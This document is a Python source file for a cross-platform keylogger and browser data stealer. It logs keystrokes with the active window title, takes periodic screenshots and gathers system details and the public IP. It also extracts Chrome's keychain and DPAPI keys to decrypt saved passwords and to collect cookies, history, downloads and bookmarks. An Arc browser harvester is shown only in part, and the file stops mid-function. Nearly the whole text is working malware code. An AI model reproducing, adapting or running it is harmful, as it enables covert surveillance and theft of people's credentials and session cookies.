"""
Advanced Keylogger with Browser Data Extraction for Mac, Windows, and Linux

This module implements a keylogger and browser credential harvester
with support for screenshots, system information gathering, and
encrypted data storage.
"""

import base64
import binascii
import json
import os
import platform
import hashlib
import re
import shutil
import socket
import sqlite3
import string
import subprocess
import tempfile
import time
import requests
import datetime

from importlib import import_module
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES

# Third-party imports
try:
    from PIL import ImageGrab
    from pynput.keyboard import Key, Listener
    from Crypto.Cipher import AES
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.fernet import Fernet
    import keyring
except ImportError:
    print("Required packages not installed. Trying to install...")
    print("pip install pillow pynput pycryptodomex cryptography")
    try:
        subprocess.run(["pip", "install", "pillow", "pynput", "pycryptodomex", "cryptography"])
        print("Packages installed successfully")
    except Exception as e:
        print(f"Failed to install packages: {e}")
        exit(1)

# Configuration constants
LOGGER_OUTPUT = "logger.txt"
COMPUTER_INFORMATION = "computer_information.txt"
SCREENSHOT_DIRECTORY = "screenshots"
SCREENSHOT_COUNT = 10
SCREENSHOT_INTERVAL = 10

# Generate encryption key for secure storage
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)


class KeyLogger:
    """
    Keylogger implementation with screenshot capabilities.
    
    This class handles keyboard event monitoring, active window
    tracking, and periodic screenshot capture.
    """
    
    def __init__(self, interval=0):
        self.LOGGER_OUTPUT = LOGGER_OUTPUT
        self.COMPUTER_INFORMATION = COMPUTER_INFORMATION
        self.SCREENSHOT_DIRECTORY = SCREENSHOT_DIRECTORY
        self.interval = interval
    
    def on_press(self, key):
        """
        Handle key press events and log them with the active window title.
        
        Args:
            key: The key that was pressed
        """
        current_window = self.get_active_window()

        # Format special keys for better readability
        with open(self.LOGGER_OUTPUT, "a") as f:
            key_str = key
            if key == Key.space:
                key_str = " "
            elif key == Key.enter:
                key_str = "\n" 
            elif key == Key.tab:
                key_str = "\t"
            
            # Log the key with the window title
            f.write(f"{current_window} - ({key_str})\n")

    def get_computer_information(self):
        """Collect and log system information"""
        with open(self.COMPUTER_INFORMATION, "a") as f:
            hostname = socket.gethostname()

            try:
                public_ip = requests.get("https://api.ipify.org?format=json").json()
                f.write(f'\nPublic IP: {public_ip["ip"]}\n')
            except:
                f.write(f'\nPublic IP: Could not be retrieved\n')
                
            f.write(f'Hostname: {hostname}\n')
            f.write(f'Operating System: {platform.system()} {platform.version()}\n')
            f.write(f'Processor: {platform.processor()}\n')

    def make_screenshot(self):
        """Capture and save a screenshot with timestamp"""
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = Path(__file__).parent.joinpath(
                self.SCREENSHOT_DIRECTORY, 
                f"{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}_screenshot.png"
            )
            screenshot.save(screenshot_path)
        except Exception as e:
            print(f"Screenshot error: {e}")
    
    def run(self):
        """Main method to start the keylogger"""
        # Create screenshots directory if it doesn't exist
        if not os.path.exists(SCREENSHOT_DIRECTORY):
            os.mkdir(SCREENSHOT_DIRECTORY)
            
        self.get_computer_information()
        with Listener(on_press=self.on_press) as listener:
            self.take_screenshot()
            listener.join()

    def take_screenshot(self):
        """Take multiple screenshots at set intervals"""
        for i in range(SCREENSHOT_COUNT):
            self.make_screenshot()
            time.sleep(SCREENSHOT_INTERVAL)

    def get_active_window(self):
        """
        Get the title of the currently active window based on OS.
        
        Returns:
            str: The title of the active window
        """
        title = "Unknown Window"

        if platform.system() == "Windows":
            try:
                import win32gui
                title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                if not title:
                    title = "Unknown Window"
            except ImportError:
                title = "Could not get window title (win32gui not available)"
        
        elif platform.system() == "Darwin":  # macOS
            try:
                result = subprocess.run(
                    ['osascript', '-e', 'tell application "System Events" to get name of first application process whose frontmost is true'], 
                    capture_output=True, 
                    text=True
                )
                if result.returncode == 0 and result.stdout.strip():
                    title = result.stdout.strip()
                else:
                    title = "Unknown Window"
            except Exception:
                title = "Could not get window title on macOS"
        
        else:  # Linux
            try:
                from Xlib import display
                d = display.Display()
                window = d.get_input_focus().focus
                window_name = window.get_name()
                d.close()
                
                if window_name:
                    title = window_name
            except Exception:
                title = "Could not get window title on Linux"
        
        return title


class BrowserBase:
    """Base class for browser data extraction"""
    
    def __init__(self):
        """Initialize the browser base class"""
        self.system = platform.system()
        self.temp_dir = tempfile.mkdtemp()
        self.user_home = os.path.expanduser("~")
        self.dbpath = None
        self.results = {
            'passwords': [],
            'cookies': [],
            'history': [],
            'downloads': [],
            'credit_cards': [],
        }
    
    def _copy_db_file(self, source_file):
        """
        Create a temporary copy of the database file.
        
        Args:
            source_file: Path to the source database file
            
        Returns:
            str: Path to the temporary copy, or None if failed
        """
        if not os.path.exists(source_file):
            print(f"Source file not found: {source_file}")
            return None
            
        temp_file = os.path.join(self.temp_dir, f"temp_{os.path.basename(source_file)}")
        try:
            shutil.copy2(source_file, temp_file)
            return temp_file
        except Exception as e:
            print(f"Failed to copy {source_file}: {e}")
            return None
    
    def get_browser_paths(self):
        """To be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement get_browser_paths()")
    
    def get_passwords(self):
        """To be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement get_passwords()")
    
    def get_history(self):
        """To be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement get_history()")
        
    def cleanup(self):
        """Clean up temporary files"""
        try:
            shutil.rmtree(self.temp_dir)
        except Exception as e:
            print(f"Error cleaning up temporary directory: {e}")


class ChromeBrowser(BrowserBase):
    """Chrome browser data extraction class"""
    
    def __init__(self):
        """Initialize Chrome browser data harvester"""
        super().__init__()
        self.passwords = {'data': []}
        self.history = {'data': []}
        self.bookmarks = {'data': []}
        self.downloads = {'data': []}
        self.cookies = {'data': []}
        
        # Initialize based on the operating system
        if self.system == "Darwin":
            self._mac_chrome_init()
        elif self.system == "Windows":
            self._win_chrome_init()
        elif self.system == "Linux":
            self._linux_chrome_init()
    
    def get_browser_paths(self):
        """
        Get paths to Chrome data directories based on the operating system.
        
        Returns:
            list: List of tuples containing (path, browser_name)
        """
        browser_paths = []
        
        if self.system == "Windows":
            local_appdata = os.getenv('LOCALAPPDATA')
            browser_paths = [
                (os.path.join(local_appdata, 'Google', 'Chrome', 'User Data'), 'chrome'),
            ]

        elif self.system == "Darwin":  # macOS
            home = os.path.expanduser('~')
            browser_paths = [
                (os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', "User Data"), 'chrome'),
            ]

        elif self.system == "Linux":
            home = os.path.expanduser('~')
            browser_paths = [
                (os.path.join(home, '.config', 'google-chrome'), 'chrome'),
            ]
            
        # Filter to only existing paths
        return [(path, name) for path, name in browser_paths if os.path.exists(path)]
    
    def _mac_chrome_init(self):
        """Initialize the encryption key for Chrome on macOS"""
        # Try different possible keychain entry names for Chrome
        keychain_entries = [
            "Chrome",
            "Chrome Safe Storage",
            "'Chrome Safe Storage'",
            "Chromium",
            "Chromium Safe Storage"
        ]
        
        secret_pass_key = None
        for entry in keychain_entries:
            try:
                # Try to get the password from keychain
                cmd = f"security find-generic-password -wa {entry}"
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True
                )
                stdout, _ = process.communicate()
                
                if process.returncode == 0 and stdout:
                    secret_pass_key = stdout.replace(b'\n', b'')
                    break
            except Exception as e:
                pass
        
        if not secret_pass_key:
            secret_pass_key = b'peanuts'
        
        # Print debug info
        print(f"Keychain password found (starting bytes): {secret_pass_key[:4] if len(secret_pass_key) > 4 else secret_pass_key}...")
        
        # Chrome parameters for macOS
        key = hashlib.pbkdf2_hmac(
            'sha1', 
            secret_pass_key, 
            b'saltysalt', 
            iterations=1003, 
            dklen=16
        )
        
        # Print derived key for debugging
        print(f"Derived key (hex): {key.hex()}")
        
        # Set the key for use in decryption
        self.key = key
        
        # Adjust Chrome paths for macOS
        user_home = os.path.expanduser("~")
        chrome_path = os.path.join(user_home, "Library", "Application Support", "Google", "Chrome")
        default_path = os.path.join(chrome_path, "Default")
        
        # Check if the Default directory exists, otherwise try to find profiles
        if os.path.exists(default_path):
            self.dbpath = default_path
        else:
            # Try to find any Chrome profiles
            if os.path.exists(chrome_path):
                profiles = [d for d in os.listdir(chrome_path) if os.path.isdir(os.path.join(chrome_path, d))]
                if profiles:
                    self.dbpath = os.path.join(chrome_path, profiles[0])
                else:
                    return
            else:
                return
        
        # Set up database paths
        self.login_data_db = os.path.join(self.dbpath, "Login Data")
        self.history_db = os.path.join(self.dbpath, "History")
        self.cookies_db = os.path.join(self.dbpath, "Cookies")
        self.bookmarks_file = os.path.join(self.dbpath, "Bookmarks")

    def _win_chrome_init(self):
        """Initialize Chrome database paths on Windows"""
        browser_paths = self.get_browser_paths()

        if not browser_paths:
            print("No Chrome browser paths found")
            return
        
        base_path = browser_paths[0][0]
        self.dbpath = os.path.join(base_path, "Default")
        self.login_data_db = os.path.join(self.dbpath, "Login Data")
        self.history_db = os.path.join(self.dbpath, "History")
        self.cookies_db = os.path.join(self.dbpath, "Cookies")
        self.bookmarks_file = os.path.join(self.dbpath, "Bookmarks")

        if not os.path.exists(self.dbpath):
            print(f"Database path does not exist: {self.dbpath}")
    
    def _linux_chrome_init(self):
        """Initialize the encryption key for Chrome on Linux"""
        try:
            # On Linux, Chrome typically uses a simple encryption with a hardcoded key
            # Fallback to a known value if we can't import the required modules
            secret_pass_key = b'peanuts'
            
            # Try to get the actual key from the secret service if available
            try:
                import secretstorage
                bus = secretstorage.dbus_init()
                collection = secretstorage.get_default_collection(bus)
                for item in collection.get_all_items():
                    if item.get_label() == 'Chrome Safe Storage':
                        secret_pass_key = item.get_secret()
                        break
            except ImportError:
                print("secretstorage module not available, using fallback key")
            except Exception as e:
                print(f"Error retrieving Chrome key from secretstorage: {e}")
            
            # Chrome on Linux uses these values for key derivation
            iterations = 1
            salt = b'saltysalt'
            length = 16

            # Derive the actual key
            kdf = import_module('Crypto.Protocol.KDF')
            self.key = kdf.PBKDF2(secret_pass_key, salt, length, iterations)
            
            # Get browser paths for Linux
            browser_paths = self.get_browser_paths()
            if not browser_paths:
                print("No Chrome browser paths found")
                return
                
            base_path = browser_paths[0][0]
            # Chrome on Linux typically has the Default profile here
            self.dbpath = os.path.join(base_path, "Default")
            if not os.path.exists(self.dbpath):
                self.dbpath = base_path  # Some Linux installations might not have "Default"
                
            # Set database paths
            self.login_data_db = os.path.join(self.dbpath, "Login Data")
            self.history_db = os.path.join(self.dbpath, "History")
            self.cookies_db = os.path.join(self.dbpath, "Cookies")
            self.bookmarks_file = os.path.join(self.dbpath, "Bookmarks")
            
        except Exception as e:
            print(f"Error initializing Chrome on Linux: {e}")
    
    def _chrome_decrypt_mac(self, encrypted_data):
        """
        Decrypt Chrome password data on macOS.
        
        Args:
            encrypted_data: The encrypted password data
            
        Returns:
            str: The decrypted password
        """
        if not encrypted_data:
            return ""
            
        # Fallback
        try:
            aes = import_module('Crypto.Cipher.AES')
            i_vector = b' ' * 16

            enc_passwd = encrypted_data[3:] if len(encrypted_data) > 3 else encrypted_data
            cipher = aes.new(self.key, aes.MODE_CBC, IV=i_vector)
            decrypted = cipher.decrypt(enc_passwd)

            return decrypted.strip().decode('utf8', errors='replace')
            
        except Exception as e:
            print(f"Mac decryption error: {e}")
            return ""
    
    def _chrome_decrypt_win(self, encrypted_data):
        """
        Decrypt Chrome password data on Windows.
        
        Args:
            encrypted_data: The encrypted password data
            
        Returns:
            str: The decrypted password
        """
        if not encrypted_data:
            return ""
        
        try:
            import win32crypt

            data = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)

            return data[1].decode('utf8')
        except Exception as e:
            print(f"Windows decryption error: {e}")
            return ""
    
    def _chrome_decrypt_linux(self, encrypted_data):
        """
        Decrypt Chrome password data on Linux.
        
        Args:
            encrypted_data: The encrypted password data
            
        Returns:
            str: The decrypted password
        """
        if not encrypted_data:
            return ""
            
        try:
            # Handle different encryption formats (similar to macOS)
            if len(encrypted_data) > 3 and encrypted_data[:3] in (b'v10', b'v11'):
                # Chrome v80+ uses AES-GCM
                nonce = encrypted_data[3:15]
                # In Chrome/Arc AES-GCM format, tag is appended to ciphertext
                ciphertext_with_tag = encrypted_data[15:]
                
                # Use AES-GCM mode
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                try:
                    aesgcm = AESGCM(self.key)
                    decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
                    # Filter out non-printable characters
                    clean_bytes = bytes(b for b in decrypted if 32 <= b <= 126 or b in (9, 10, 13))
                    cleaned_str = clean_bytes.decode('utf-8', errors='replace')
                    # Remove trailing nulls and spaces
                    cleaned_str = cleaned_str.rstrip('\0 \t\r\n')
                    return cleaned_str
                except Exception as e:
                    print(f"AES-GCM decryption failed (detailed): {e}")
                    # Try alternative approach
                    try:
                        # Debug info
                        print(f"Encrypted data length: {len(encrypted_data)}")
                        print(f"Nonce length: {len(nonce)}")
                        
                        # Try with cryptography's Cipher instead of AESGCM
                        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                        from cryptography.hazmat.backends import default_backend
                        
                        cipher = Cipher(
                            algorithms.AES(self.key),
                            modes.GCM(nonce),
                            backend=default_backend()
                        )
                        decryptor = cipher.decryptor()
                        
                        # Split ciphertext and tag (tag is the last 16 bytes)
                        ciphertext = ciphertext_with_tag[:-16]
                        tag = ciphertext_with_tag[-16:]
                        
                        # Decrypt and verify
                        decrypted = decryptor.update(ciphertext) + decryptor.finalize_with_tag(tag)
                        # Filter out non-printable characters
                        clean_bytes = bytes(b for b in decrypted if 32 <= b <= 126 or b in (9, 10, 13))
                        cleaned_str = clean_bytes.decode('utf-8', errors='replace')
                        # Remove trailing nulls and spaces
                        cleaned_str = cleaned_str.rstrip('\0 \t\r\n')
                        return cleaned_str
                    except Exception as e2:
                        print(f"Alternative decryption also failed: {e2}")
            
            # Fallback
            aes = import_module('Crypto.Cipher.AES')
            i_vector = b' ' * 16

            enc_passwd = encrypted_data[3:] if len(encrypted_data) > 3 else encrypted_data
            cipher = aes.new(self.key, aes.MODE_CBC, IV=i_vector)
            decrypted = cipher.decrypt(enc_passwd)

            return decrypted.strip().decode('utf8', errors='replace')
            
        except Exception as e:
            print(f"Linux decryption error: {e}")
            return ""
    
    def decrypt_password(self, encrypted_data):
        """
        Decrypt password using the appropriate method for the current OS
        
        Args:
            encrypted_data: The encrypted password data
            
        Returns:
            str: The decrypted password
        """
        if self.system == "Windows":
            return self._chrome_decrypt_win(encrypted_data)
        elif self.system == "Linux":
            return self._chrome_decrypt_linux(encrypted_data)
        else:  # Darwin/macOS
            return self._chrome_decrypt_mac(encrypted_data)
    
    def get_passwords(self):
        """
        Extract passwords from Chrome's Login Data database.
        
        Returns:
            dict: Dictionary containing the extracted password data
        """
        if not hasattr(self, 'login_data_db') or not self.login_data_db:
            print("Login database path not initialized")
            return {'data': []}
            
        try:
            # Copy the database to a temporary file
            temp_db = self._copy_db_file(self.login_data_db)
            if not temp_db:
                return {'data': []}
                
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Check if logins table exists
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
            if not cursor.fetchone():
                print("No logins table found in database")
                return {'data': []}
            
            # Extract the data
            cursor.execute("""
                SELECT action_url, username_value, password_value
                FROM logins
            """)
            
            data = {'data': []}
            for result in cursor.fetchall():
                try:
                    if result[2]:
                        password = self.decrypt_password(result[2])
                        password = ''.join(c for c in password if c in string.printable)
                        
                        if result[1] or password:  # Only add if username or password exists
                            entry = {
                                'url': result[0],
                                'username': result[1],
                                'password': password
                            }
                            data['data'].append(entry)
                except Exception as e:
                    print(f"Error decrypting password: {e}")
            
            conn.close()
            self.passwords = data

            return data
            
        except Exception as e:
            print(f"Error processing Chrome database: {e}")
            return {'data': []}
        finally:
            # Clean up
            if 'temp_db' in locals() and os.path.exists(temp_db):
                try:
                    os.unlink(temp_db)
                except:
                    pass
    
    def get_history(self):
        """
        Extract browsing history from Chrome's History database.
        
        Returns:
            dict: Dictionary containing the extracted history data
        """
        if not hasattr(self, 'history_db') or not self.history_db:
            return {'data': []}
        
        if not os.path.exists(self.history_db):
            return {'data': []}
            
        try:
            # Copy the database to a temporary file
            temp_db = self._copy_db_file(self.history_db)
            if not temp_db:
                return {'data': []}
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Check if urls table exists
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='urls'")
            if not cursor.fetchone():
                return {'data': []}
            
            # Extract the data
            cursor.execute("""
                SELECT urls.url, urls.title, urls.visit_count, 
                       urls.last_visit_time, visits.visit_time 
                FROM urls LEFT JOIN visits ON urls.id = visits.url
                ORDER BY urls.last_visit_time DESC
                LIMIT 100
            """)
            
            data = {'data': []}
            for result in cursor.fetchall():
                try:
                    url, title, visit_count, last_visit_time, visit_time = result
                    
                    # Convert Chrome timestamp to readable format
                    if last_visit_time:
                        chrome_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_visit_time)
                        last_visit_time = chrome_time.strftime('%Y-%m-%d %H:%M:%S')
                    
                    entry = {
                        'url': url,
                        'title': title,
                        'visit_count': visit_count,
                        'last_visit_time': last_visit_time
                    }
                    data['data'].append(entry)
                except Exception:
                    pass
            
            conn.close()
            self.history = data
            return data
            
        except Exception as e:
            return {'data': []}
        finally:
            # Clean up
            if 'temp_db' in locals() and os.path.exists(temp_db):
                try:
                    os.unlink(temp_db)
                except:
                    pass
    
    def get_bookmarks(self):
        """
        Extract bookmarks from Chrome's Bookmarks file.
        
        Returns:
            dict: Dictionary containing the extracted bookmarks data
        """
        if not hasattr(self, 'bookmarks_file') or not self.bookmarks_file:
            return {'data': []}
        
        if not os.path.exists(self.bookmarks_file):
            return {'data': []}
        
        try:
            with open(self.bookmarks_file, 'r', encoding='utf-8') as f:
                bookmarks_json = json.load(f)
            
            data = {'data': []}
            
            # Process bookmark roots (typically "bookmark_bar", "other", "synced")
            roots = bookmarks_json.get('roots', {})
            
            for root_name, root in roots.items():
                self._process_bookmark_node(root, data['data'], folder_path=root_name)
            
            self.bookmarks = data
            return data
            
        except Exception as e:
            return {'data': []}
    
    def _process_bookmark_node(self, node, result_list, folder_path=""):
        """
        Recursively process bookmark nodes and extract bookmark data.
        
        Args:
            node: Current bookmark node to process
            result_list: List to append bookmark entries to
            folder_path: Current folder path string
        """
        # Process a URL bookmark
        if node.get('type') == 'url':
            name = node.get('name', '')
            url = node.get('url', '')
            added = node.get('date_added', '')
            
            # Convert Chrome timestamp if available
            if added:
                try:
                    chrome_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=int(added))
                    added = chrome_time.strftime('%Y-%m-%d %H:%M:%S')
                except:
                    added = ""
            
            # Add bookmark to results
            entry = {
                'url': url,
                'name': name,
                'folder': folder_path,
                'date_added': added
            }
            result_list.append(entry)
        
        # Process a folder
        elif node.get('type') == 'folder':
            folder_name = node.get('name', '')
            new_path = f"{folder_path}/{folder_name}" if folder_path else folder_name
            
            # Process all children in this folder
            for child in node.get('children', []):
                self._process_bookmark_node(child, result_list, folder_path=new_path)

    def get_downloads(self):
        """
        Extract download history from Chrome's History database.
        
        Returns:
            dict: Dictionary containing the extracted download data
        """
        if not hasattr(self, 'history_db') or not self.history_db:
            return {'data': []}
        
        if not os.path.exists(self.history_db):
            return {'data': []}
        
        try:
            # Copy the database to a temporary file
            temp_history = self._copy_db_file(self.history_db)
            if not temp_history:
                return {'data': []}
            
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            
            # Determine the schema of the downloads table
            cursor.execute("PRAGMA table_info(downloads)")
            columns = cursor.fetchall()
            column_names = [col[1] for col in columns]
            
            # Build a query based on the actual schema
            select_fields = []
            if 'target_path' in column_names:
                select_fields.append('downloads.target_path')
            else:
                select_fields.append("'' AS target_path")
                
            if 'tab_url' in column_names:
                select_fields.append('downloads.tab_url')
            else:
                select_fields.append("'' AS tab_url")
            
            if 'referrer' in column_names:
                select_fields.append('downloads.referrer')
            else:
                select_fields.append("'' AS referrer")
            
            if 'start_time' in column_names:
                select_fields.append('downloads.start_time')
            else:
                select_fields.append("0 AS start_time")
            
            if 'end_time' in column_names:
                select_fields.append('downloads.end_time')
            else:
                select_fields.append("0 AS end_time")
            
            if 'total_bytes' in column_names:
                select_fields.append('downloads.total_bytes')
            else:
                select_fields.append("0 AS total_bytes")
            
            if 'state' in column_names:
                select_fields.append('downloads.state')
            else:
                select_fields.append("0 AS state")
            
            # Check if downloads_url_chains table exists
            has_url_chains = False
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='downloads_url_chains'")
            if cursor.fetchone():
                has_url_chains = True
            
            query = f"""
                SELECT
                    {', '.join(select_fields)}
                    {', downloads_url_chains.url' if has_url_chains else ", '' AS url"}
                FROM
                    downloads
                {f'LEFT JOIN downloads_url_chains ON downloads.id = downloads_url_chains.id' if has_url_chains else ''}
                ORDER BY
                    downloads.start_time DESC
                LIMIT 100
            """
            
            cursor.execute(query)
            
            results = cursor.fetchall()
            
            data = {'data': []}
            for result in results:
                try:
                    # Adjust unpacking based on the number of fields returned
                    if has_url_chains:
                        target_path, tab_url, referrer, start_time, end_time, total_bytes, state, chain_url = result
                    else:
                        target_path, tab_url, referrer, start_time, end_time, total_bytes, state = result
                        chain_url = ""
                    
                    # Convert Chrome timestamps to readable format
                    start_time_str = ""
                    end_time_str = ""
                    
                    if start_time:
                        try:
                            start_time_date = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=start_time)
                            start_time_str = start_time_date.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            pass
                    
                    if end_time:
                        try:
                            end_time_date = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=end_time)
                            end_time_str = end_time_date.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            pass
                    
                    # Format file size
                    size_str = ""
                    if total_bytes:
                        try:
                            # Convert to MB with 2 decimal places
                            if total_bytes > 1024 * 1024:
                                size_str = f"{total_bytes / (1024 * 1024):.2f} MB"
                            # Convert to KB with 2 decimal places
                            elif total_bytes > 1024:
                                size_str = f"{total_bytes / 1024:.2f} KB"
                            else:
                                size_str = f"{total_bytes} bytes"
                        except:
                            size_str = str(total_bytes) + " bytes"
                    
                    # Get filename from target path
                    filename = os.path.basename(target_path) if target_path else ""
                    
                    # Map download state to readable format
                    state_map = {
                        0: "In Progress",
                        1: "Complete",
                        2: "Cancelled",
                        3: "Interrupted",
                        4: "Interrupted"
                    }
                    status = state_map.get(state, "Unknown")
                    
                    entry = {
                        'filename': filename,
                        'target_path': target_path,
                        'url': chain_url or tab_url or referrer,
                        'start_time': start_time_str,
                        'end_time': end_time_str,
                        'size': size_str,
                        'status': status
                    }
                    data['data'].append(entry)
                except Exception:
                    pass
            
            conn.close()
            self.downloads = data
            return data
            
        except Exception:
            return {'data': []}
        finally:
            # Clean up
            if 'temp_history' in locals() and os.path.exists(temp_history):
                try:
                    os.unlink(temp_history)
                except:
                    pass

    def get_cookies(self):
        """
        Extract cookies from Chrome's Cookies database.
        
        Returns:
            dict: Dictionary containing the extracted cookie data
        """
        if not hasattr(self, 'cookies_db') or not self.cookies_db:
            return {'data': []}
        
        if not os.path.exists(self.cookies_db):
            return {'data': []}
        
        try:
            temp_cookies = self._copy_db_file(self.cookies_db)
            if not temp_cookies:
                return {'data': []}
            
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            
            # Check if cookies table exists
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
            if not cursor.fetchone():
                return {'data': []}
            
            # Determine schema of cookies table
            cursor.execute("PRAGMA table_info(cookies)")
            columns = cursor.fetchall()
            column_names = [col[1] for col in columns]
            
            # Build query based on available columns
            select_fields = []
            for field in ['host_key', 'name', 'path', 'value', 'creation_utc', 
                         'expires_utc', 'last_access_utc', 'is_secure', 'is_httponly']:
                if field in column_names:
                    select_fields.append(f'cookies.{field}')
                else:
                    # Default value if column doesn't exist
                    if field in ['is_secure', 'is_httponly']:
                        select_fields.append('0')
                    elif field in ['creation_utc', 'expires_utc', 'last_access_utc']:
                        select_fields.append('0')
                    else:
                        select_fields.append("''")
            
            query = f"""
                SELECT {', '.join(select_fields)}
                FROM cookies
                ORDER BY host_key
                LIMIT 500
            """
            
            cursor.execute(query)
            
            results = cursor.fetchall()
            data = {'data': []}
            
            for row in results:
                try:
                    # Unpack all fields
                    host, name, path, value, creation, expires, last_access, secure, httponly = row
                    
                    # Convert timestamps
                    if creation:
                        try:
                            creation_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=creation)
                            creation_time = creation_time.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            creation_time = ""
                    else:
                        creation_time = ""
                    
                    if expires:
                        try:
                            expiration_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=expires)
                            expiration_time = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            expiration_time = ""
                    else:
                        expiration_time = ""
                    
                    if last_access:
                        try:
                            access_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_access)
                            access_time = access_time.strftime('%Y-%m-%d %H:%M:%S')
                        except:
                            access_time = ""
                    else:
                        access_time = ""
                        
                    entry = {
                        'host': host,
                        'name': name,
                        'path': path,
                        'value': value,
                        'creation_time': creation_time,
                        'expiration_time': expiration_time,
                        'access_time': access_time,
                        'secure': bool(secure),
                        'httponly': bool(httponly)
                    }
                    data['data'].append(entry)
                except Exception:
                    pass
                
            conn.close()
            self.cookies = data
            return data
        
        except Exception:
            return {'data': []}
        finally:
            # Clean up
            if 'temp_cookies' in locals() and os.path.exists(temp_cookies):
                try:
                    os.unlink(temp_cookies)
                except:
                    pass
    
    def harvest_data(self):
        """
        Harvest all available data from Chrome.
        
        Returns:
            dict: Dictionary containing all the extracted data
        """
        self.get_passwords()
        self.get_history()
        self.get_bookmarks()
        self.get_downloads()
        self.get_cookies()
        
        return {
            'passwords': self.passwords,
            'history': self.history,
            'bookmarks': self.bookmarks,
            'downloads': self.downloads,
            'cookies': self.cookies
        }
    
class ArcBrowser(BrowserBase):
    """
    Extract saved credentials from Arc browser.
    """
    def __init__(self):
        super().__init__()
        self.passwords = {'data': []}
        self.history = {'data': []}
        self.bookmarks = {'data': []}
        self.downloads = {'data': []}
        self.cookies = {'data': []}
    
    def get_browser_paths(self):
        """
        Get the paths to the browser databases.
        """
        browser_paths = []
        
        if self.system == "Windows":
            local_appdata = os.getenv('LOCALAPPDATA')
            browser_paths = [
                (os.path.join(local_appdata, "Arc", "User Data", "Default"), 'arc'),
            ]

        elif self.system == "Darwin":  # macOS
            home = os.path.expanduser('~')
            browser_paths = [
                (os.path.join(home, 'Library', 'Application Support', 'Arc', "User Data", "Default"), 'arc'),
            ]

        elif self.system == "Linux":
            home = os.path.expanduser('~')
            browser_paths = [
                (os.path.join(home, ".config", "Arc", "Local Storage"), 'arc'),
            ]
            
        # Filter to only existing paths
        return [(path, name) for path, name in browser_paths if os.path.exists(path)]

    def get_encryption_key(self, browser_path):
        """
        Get the encryption key for browser password decryption.
        
        Args:
            browser_path (str): Path to browser profile directory
            
        Returns:
            bytes: The decryption key, or None if retrieval fails
        """
        system = self.system
        
        # Platform-specific key retrieval
        if system == "Darwin":       # macOS
            return self._get_encryption_key_mac()
        elif system == "Windows":    # Windows
            return self._get_encryption_key_windows(browser_path)
        elif system == "Linux":      # Linux
            return self._get_encryption_key_linux()
        
        return None
        
    def _get_encryption_key_mac(self):
        """Get the encryption key from macOS keychain"""
        try:
            # Chrome-based browsers store the key in keychain
            keychain_candidates = [
                # Format: (account, service)
                ('Arc', 'Arc Safe Storage'),
                ('Chrome', 'Chrome Safe Storage')
            ]
            
            # Try each possible keychain entry
            for account, service in keychain_candidates:
                cmd = ['security', 'find-generic-password', '-w', '-a', account, '-s', service]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, _ = process.communicate()
                
                if process.returncode == 0:
                    # Derive the AES key using PBKDF2
                    password = stdout.strip()
                    if isinstance(password, str):
                        password = password.encode('utf-8')
                    
                    return hashlib.pbkdf2_hmac(
                        'sha1', 
                        password, 
                        b'saltysalt',  # Fixed salt used by Chrome
                        iterations=1003,  # Iteration count used by Chrome
                        dklen=16  # 128-bit AES key
                    )
            
            return None
        except Exception:
            return None
            
    def _get_encryption_key_windows(self, browser_path):
        """Get the encryption key on Windows"""
        try:
            # Get browser paths if not provided
            if not browser_path:
                browser_paths = self.get_browser_paths()
                if not browser_paths:
                    return None
                browser_path = browser_paths[0][0]
                
            # Find the Local State file with the encrypted key
            local_state_path = self._find_local_state_file(browser_path)
            if not local_state_path:
                return None
            
            # Load and parse the Local State file
            local_state = self._load_json_file(local_state_path)
            if not local_state:
                return None
            
            # Extract and decrypt the key
            if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
                return None
                
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            
            # Remove DPAPI prefix if present
            if not encrypted_key.startswith(b'DPAPI'):
                return None
                
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            
            # Use Windows DPAPI to decrypt the key
            import win32crypt
            try:
                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except Exception:
                return None
                
        except Exception:
            return None
            
    def _find_local_state_file(self, browser_path):
        """Find the Local State file containing the encryption key"""
        potential_paths = [
            os.path.join(browser_path, "..", "Local State"),  # Up one level
